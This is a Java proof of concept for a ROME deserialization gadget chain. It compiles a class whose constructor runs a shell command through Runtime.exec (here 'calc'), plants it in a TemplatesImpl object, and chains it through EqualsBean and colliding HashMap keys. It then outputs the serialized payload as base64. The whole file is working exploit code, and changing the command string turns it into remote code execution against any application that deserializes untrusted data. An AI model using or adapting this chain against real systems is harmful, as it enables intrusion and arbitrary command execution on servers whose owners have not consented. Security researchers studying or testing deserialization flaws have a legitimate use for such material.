import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ObjectBean;
import com.sun.syndication.feed.impl.ToStringBean;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import javax.xml.transform.Templates;
import java.util.HashMap;
import java.util.Map;

public class Main {
    public static void main(String[] args) throws Exception{
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.makeClass("a");
        CtClass superClass = pool.get(AbstractTranslet.class.getName());
        clazz.setSuperclass(superClass);
        CtConstructor constructor = new CtConstructor(new CtClass[]{}, clazz);
        constructor.setBody("Runtime.getRuntime().exec(\"calc\");");
        clazz.addConstructor(constructor);

        byte[][] bytes = new byte[][]{clazz.toBytecode()};
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        PocHelper.setFieldValue(templates, "_bytecodes", bytes);
        PocHelper.setFieldValue(templates, "_name", "1");
        PocHelper.setFieldValue(templates, "_tfactory", null);

        EqualsBean bean = new EqualsBean(String.class,"");
        HashMap map1 = new HashMap();
        HashMap map2 = new HashMap();
        map1.put("aa",templates);
        map1.put("bB",bean);
        map2.put("aa",bean);
        map2.put("bB",templates);
        HashMap map = new HashMap();
        map.put(map1,"");
        map.put(map2,"");

        PocHelper.setFieldValue(bean,"_beanClass",Templates.class);
        PocHelper.setFieldValue(bean,"_obj",templates);

        PocHelper.OutBase64Encode(map);
//        PocHelper.writeSer(map,"ROME.ser");
        PocHelper.readSer("ROME.ser");

    }

}
